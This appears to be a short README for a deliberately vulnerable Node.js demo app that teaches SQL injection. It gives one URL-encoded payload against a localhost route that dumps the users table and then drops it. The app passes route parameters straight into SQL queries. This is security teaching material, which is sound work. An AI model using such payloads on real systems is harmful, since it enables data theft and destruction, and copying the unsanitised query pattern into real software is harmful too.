# Node SQL Injection demo

## SQL injection vulnerabilities for retrieving entire users table and delete everything

## Example

The following example will exploit the fact that the route parameter is used directly as input in the SQL query enabeling us to drop the entire database:

```code
http://localhost:3000/users/8%20OR%201%20=%201;%20DROP%20TABLE%20users--
```
